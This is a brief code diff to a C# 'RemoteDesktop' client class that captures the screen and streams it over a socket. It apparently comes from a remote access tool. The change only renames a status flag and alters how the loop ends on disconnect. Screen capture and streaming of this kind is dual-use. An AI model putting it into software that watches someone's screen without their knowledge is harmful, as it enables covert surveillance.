@@ -12,15 +12,15 @@ namespace Client.Handle_Packet
 {
     class RemoteDesktop
     {
-        public static bool RemoteDesktop_Status { get; set; }
+        public static bool RemoteDesktopStatus { get; set; }
         public static void CaptureAndSend()
         {
             try
             {
                 IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(60);
-                while (RemoteDesktop_Status == true)
+                while (RemoteDesktopStatus == true)
                 {
-                    if (!ClientSocket.Client.Connected) break;
+                    if (!ClientSocket.Client.Connected) RemoteDesktopStatus = false;
                     Bitmap bmp = GetScreen();
                     Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                     Size size = new Size(bmp.Width, bmp.Height);
